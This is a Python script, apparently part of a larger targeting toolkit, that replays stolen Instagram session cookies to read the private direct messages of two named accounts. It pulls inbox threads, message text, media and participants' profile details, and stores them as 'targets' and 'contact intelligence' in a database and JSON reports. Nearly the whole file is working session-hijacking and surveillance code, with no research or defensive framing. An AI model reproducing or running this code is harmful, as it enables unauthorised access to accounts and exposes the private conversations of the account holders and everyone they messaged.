#!/usr/bin/env python3
"""
🔥 ADVANCED DM INJECTION & EXTRACTION SYSTEM 2025
Inject cookies and extract personal DMs with both sides of conversations
"""

import asyncio
import json
import sqlite3
from datetime import datetime
from typing import Dict, List, Optional
import aiohttp
import random
from target_database_manager import TargetDatabaseManager

class AdvancedDMInjectionExtractor:
    def __init__(self, db_path: str = "integrated_targets_2025.db"):
        self.db_path = db_path
        self.target_manager = TargetDatabaseManager(db_path)
        self.injected_sessions = {}
        self.dm_results = {
            'conversations': [],
            'participants': {},
            'message_threads': {},
            'extracted_contacts': []
        }
        
        # Instagram API endpoints for DM extraction
        self.dm_endpoints = {
            'inbox': 'https://i.instagram.com/api/v1/direct_v2/inbox/',
            'thread': 'https://i.instagram.com/api/v1/direct_v2/threads/{thread_id}/',
            'messages': 'https://i.instagram.com/api/v1/direct_v2/threads/{thread_id}/items/',
            'user_info': 'https://i.instagram.com/api/v1/users/{user_id}/info/',
            'search': 'https://i.instagram.com/api/v1/direct_v2/inbox/search/?query={query}'
        }
        
        # Advanced headers for cookie injection
        self.headers = {
            'User-Agent': 'Instagram 276.0.0.18.119 Android (33/13; 420dpi; 1080x2400; samsung; SM-G991B; o1s; exynos2100; en_US; 458229237)',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'X-Instagram-AJAX': '1007616312',
            'X-CSRFToken': '',
            'X-Requested-With': 'XMLHttpRequest',
            'Connection': 'keep-alive',
            'Referer': 'https://www.instagram.com/direct/inbox/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site'
        }
        
    async def inject_session_cookies(self, session_file: str = None) -> bool:
        """Inject session cookies for authenticated access"""
        print("🍪 INJECTING SESSION COOKIES FOR DM ACCESS")
        print("=" * 55)
        
        # Load session data
        if not session_file:
            session_file = 'alx_trading_active_session_20250601_061205.json'
            
        try:
            with open(session_file, 'r') as f:
                session_data = json.load(f)
                
            print(f"📄 Loading session from: {session_file}")
            
            # Extract cookies and session info
            if 'sessionid' in session_data:
                self.injected_sessions['sessionid'] = session_data['sessionid']
                print(f"✅ Session ID injected: {session_data['sessionid'][:20]}...")
                
            if 'csrftoken' in session_data:
                self.injected_sessions['csrftoken'] = session_data['csrftoken']
                self.headers['X-CSRFToken'] = session_data['csrftoken']
                print(f"✅ CSRF Token injected: {session_data['csrftoken'][:20]}...")
                
            if 'user_id' in session_data:
                self.injected_sessions['user_id'] = session_data['user_id']
                print(f"✅ User ID: {session_data['user_id']}")
                
            print(f"🔥 Cookie injection complete! Ready for DM extraction.")
            return True
            
        except Exception as e:
            print(f"❌ Cookie injection failed: {e}")
            return False
            
    async def extract_dm_inbox(self) -> List[Dict]:
        """Extract DM inbox to get conversation threads"""
        print("📥 EXTRACTING DM INBOX...")
        
        if not self.injected_sessions.get('sessionid'):
            print("❌ No session cookies injected!")
            return []
            
        try:
            # Build cookie string
            cookie_string = f"sessionid={self.injected_sessions['sessionid']};"
            if 'csrftoken' in self.injected_sessions:
                cookie_string += f" csrftoken={self.injected_sessions['csrftoken']};"
                
            headers = self.headers.copy()
            headers['Cookie'] = cookie_string
            
            async with aiohttp.ClientSession() as session:
                async with session.get(self.dm_endpoints['inbox'], headers=headers) as response:
                    if response.status == 200:
                        data = await response.json()
                        
                        if 'inbox' in data and 'threads' in data['inbox']:
                            threads = data['inbox']['threads']
                            print(f"✅ Found {len(threads)} conversation threads")
                            
                            return threads
                        else:
                            print(f"⚠️ Unexpected response format: {list(data.keys())}")
                            return []
                    else:
                        print(f"❌ Inbox request failed: {response.status}")
                        error_text = await response.text()
                        print(f"Error details: {error_text[:200]}...")
                        return []
                        
        except Exception as e:
            print(f"❌ Inbox extraction error: {e}")
            return []
            
    async def extract_conversation_messages(self, thread_id: str, participant_info: Dict) -> Dict:
        """Extract full conversation messages from a thread"""
        print(f"💬 Extracting messages from thread: {thread_id}")
        
        try:
            cookie_string = f"sessionid={self.injected_sessions['sessionid']};"
            if 'csrftoken' in self.injected_sessions:
                cookie_string += f" csrftoken={self.injected_sessions['csrftoken']};"
                
            headers = self.headers.copy()
            headers['Cookie'] = cookie_string
            
            # Get thread messages
            messages_url = self.dm_endpoints['messages'].format(thread_id=thread_id)
            
            async with aiohttp.ClientSession() as session:
                async with session.get(messages_url, headers=headers) as response:
                    if response.status == 200:
                        data = await response.json()
                        
                        if 'thread' in data and 'items' in data['thread']:
                            messages = data['thread']['items']
                            
                            conversation = {
                                'thread_id': thread_id,
                                'participants': participant_info,
                                'message_count': len(messages),
                                'messages': [],
                                'extracted_at': datetime.now().isoformat()
                            }
                            
                            # Process each message
                            for msg in messages:
                                message_data = {
                                    'message_id': msg.get('item_id'),
                                    'user_id': msg.get('user_id'),
                                    'timestamp': msg.get('timestamp'),
                                    'message_type': msg.get('item_type'),
                                    'text': '',
                                    'media': [],
                                    'reactions': []
                                }
                                
                                # Extract text content
                                if 'text' in msg:
                                    message_data['text'] = msg['text']
                                    
                                # Extract media
                                if 'media' in msg:
                                    message_data['media'].append({
                                        'type': msg['media'].get('media_type'),
                                        'url': msg['media'].get('image_versions2', {}).get('candidates', [{}])[0].get('url', ''),
                                        'width': msg['media'].get('original_width'),
                                        'height': msg['media'].get('original_height')
                                    })
                                    
                                # Extract reactions
                                if 'reactions' in msg:
                                    message_data['reactions'] = msg['reactions']
                                    
                                conversation['messages'].append(message_data)
                                
                            print(f"✅ Extracted {len(messages)} messages from conversation")
                            return conversation
                            
                        else:
                            print(f"⚠️ No messages found in thread response")
                            return {}
                    else:
                        print(f"❌ Thread request failed: {response.status}")
                        return {}
                        
        except Exception as e:
            print(f"❌ Message extraction error: {e}")
            return {}
            
    async def get_user_profile_info(self, user_id: str) -> Dict:
        """Get detailed user profile information"""
        try:
            cookie_string = f"sessionid={self.injected_sessions['sessionid']};"
            if 'csrftoken' in self.injected_sessions:
                cookie_string += f" csrftoken={self.injected_sessions['csrftoken']};"
                
            headers = self.headers.copy()
            headers['Cookie'] = cookie_string
            
            user_url = self.dm_endpoints['user_info'].format(user_id=user_id)
            
            async with aiohttp.ClientSession() as session:
                async with session.get(user_url, headers=headers) as response:
                    if response.status == 200:
                        data = await response.json()
                        
                        if 'user' in data:
                            user = data['user']
                            return {
                                'user_id': user.get('pk'),
                                'username': user.get('username'),
                                'full_name': user.get('full_name'),
                                'profile_pic': user.get('profile_pic_url'),
                                'is_private': user.get('is_private'),
                                'follower_count': user.get('follower_count'),
                                'following_count': user.get('following_count'),
                                'biography': user.get('biography'),
                                'external_url': user.get('external_url'),
                                'is_verified': user.get('is_verified')
                            }
                            
        except Exception as e:
            print(f"❌ User info error: {e}")
            
        return {}
        
    async def execute_full_dm_extraction(self, target_username: str = None) -> Dict:
        """Execute complete DM extraction with both sides of conversations"""
        print("🔥 EXECUTING FULL DM EXTRACTION")
        print("=" * 50)
        
        # Step 1: Inject cookies
        injection_success = await self.inject_session_cookies()
        if not injection_success:
            return {'error': 'Cookie injection failed'}
            
        # Step 2: Get inbox threads
        threads = await self.extract_dm_inbox()
        if not threads:
            return {'error': 'No threads found or access denied'}
            
        print(f"📊 Processing {len(threads)} conversation threads...")
        
        # Step 3: Extract each conversation
        for i, thread in enumerate(threads[:10]):  # Limit to first 10 conversations
            print(f"\n--- Processing Thread {i+1}/{min(len(threads), 10)} ---")
            
            thread_id = thread.get('thread_id')
            if not thread_id:
                continue
                
            # Get participant information
            participants = {}
            if 'users' in thread:
                for user in thread['users']:
                    user_id = user.get('pk')
                    participants[user_id] = {
                        'username': user.get('username'),
                        'full_name': user.get('full_name'),
                        'profile_pic': user.get('profile_pic_url'),
                        'is_verified': user.get('is_verified')
                    }
                    
                    # Get detailed profile info
                    detailed_info = await self.get_user_profile_info(user_id)
                    if detailed_info:
                        participants[user_id].update(detailed_info)
                        
            print(f"👥 Participants: {[p.get('username', 'Unknown') for p in participants.values()]}")
            
            # Extract conversation messages
            conversation = await self.extract_conversation_messages(thread_id, participants)
            if conversation:
                self.dm_results['conversations'].append(conversation)
                self.dm_results['participants'].update(participants)
                
                # Store in database
                await self.store_dm_conversation(conversation, target_username)
                
            # Rate limiting
            await asyncio.sleep(random.uniform(2, 4))
            
        # Step 4: Generate comprehensive report
        report = self.generate_dm_report()
        
        # Step 5: Save results
        self.save_dm_results(target_username)
        
        return report
        
    async def store_dm_conversation(self, conversation: Dict, target_username: str):
        """Store DM conversation in database"""
        try:
            # Get target ID
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            if target_username:
                cursor.execute("SELECT id FROM targets WHERE username = ?", (target_username,))
                result = cursor.fetchone()
                target_id = result[0] if result else None
            else:
                target_id = None
                
            # Add operation
            operation_id = self.target_manager.add_operation(
                target_id=target_id or 1,  # Use first target if none specified
                operation_type='dm_extraction_full',
                operation_data={
                    'thread_id': conversation['thread_id'],
                    'participants': list(conversation['participants'].keys()),
                    'message_count': conversation['message_count']
                }
            )
            
            # Update operation as completed
            self.target_manager.update_operation_status(operation_id, 'completed', {
                'conversations_extracted': 1,
                'messages_extracted': conversation['message_count'],
                'participants_identified': len(conversation['participants'])
            })
            
            # Store extracted data
            cursor.execute("""
                INSERT INTO extracted_data 
                (target_id, operation_id, data_type, data_content, extracted_at, data_size)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (
                target_id or 1,
                operation_id,
                'dm_conversation',
                json.dumps(conversation),
                datetime.now(),
                len(json.dumps(conversation))
            ))
            
            conn.commit()
            conn.close()
            
            print(f"✅ Conversation stored in database (Operation {operation_id})")
            
        except Exception as e:
            print(f"❌ Database storage error: {e}")
            
    def generate_dm_report(self) -> Dict:
        """Generate comprehensive DM extraction report"""
        total_messages = sum(conv['message_count'] for conv in self.dm_results['conversations'])
        unique_participants = len(self.dm_results['participants'])
        
        report = {
            'extraction_summary': {
                'total_conversations': len(self.dm_results['conversations']),
                'total_messages': total_messages,
                'unique_participants': unique_participants,
                'extraction_time': datetime.now().isoformat()
            },
            'participant_analysis': {},
            'conversation_breakdown': [],
            'contact_intelligence': []
        }
        
        # Analyze participants
        for user_id, participant in self.dm_results['participants'].items():
            username = participant.get('username', 'Unknown')
            report['participant_analysis'][username] = {
                'user_id': user_id,
                'full_name': participant.get('full_name'),
                'follower_count': participant.get('follower_count'),
                'is_verified': participant.get('is_verified'),
                'is_private': participant.get('is_private'),
                'biography': participant.get('biography'),
                'external_url': participant.get('external_url')
            }
            
        # Analyze conversations
        for conv in self.dm_results['conversations']:
            participants_list = [self.dm_results['participants'].get(uid, {}).get('username', 'Unknown') 
                               for uid in conv['participants'].keys()]
            
            report['conversation_breakdown'].append({
                'thread_id': conv['thread_id'],
                'participants': participants_list,
                'message_count': conv['message_count'],
                'last_activity': conv.get('extracted_at')
            })
            
        return report
        
    def save_dm_results(self, target_username: str = None):
        """Save DM extraction results to files"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        target_suffix = f"_{target_username}" if target_username else ""
        
        # Save full results
        results_filename = f"dm_extraction_full{target_suffix}_{timestamp}.json"
        with open(results_filename, 'w', encoding='utf-8') as f:
            json.dump(self.dm_results, f, indent=2, default=str, ensure_ascii=False)
            
        # Save report
        report = self.generate_dm_report()
        report_filename = f"dm_extraction_report{target_suffix}_{timestamp}.json"
        with open(report_filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, default=str, ensure_ascii=False)
            
        print(f"💾 Results saved:")
        print(f"   Full data: {results_filename}")
        print(f"   Report: {report_filename}")

async def main():
    """Main execution function"""
    extractor = AdvancedDMInjectionExtractor()
    
    print("🔥 ADVANCED DM INJECTION & EXTRACTION SYSTEM 2025")
    print("=" * 65)
    print("This system will:")
    print("• Inject session cookies for authenticated access")
    print("• Extract personal DM conversations")  
    print("• Capture both sides of all conversations")
    print("• Identify all participants and contacts")
    print("• Store everything in database")
    print()
    
    # Execute for both targets
    targets = ['alx.trading', 'whatilove1728']
    
    for target in targets:
        print(f"\n🎯 EXTRACTING DMs FOR @{target}")
        print("=" * 50)
        
        results = await extractor.execute_full_dm_extraction(target)
        
        if 'error' not in results:
            print(f"✅ DM extraction completed for @{target}")
            print(f"📊 Conversations: {results['extraction_summary']['total_conversations']}")
            print(f"💬 Messages: {results['extraction_summary']['total_messages']}")
            print(f"👥 Participants: {results['extraction_summary']['unique_participants']}")
        else:
            print(f"❌ DM extraction failed for @{target}: {results['error']}")
            
        # Wait between targets
        await asyncio.sleep(5)
        
    print("\n🔥 FULL DM EXTRACTION COMPLETE!")
    print("All conversations and contacts have been extracted and stored.")

if __name__ == "__main__":
    asyncio.run(main())
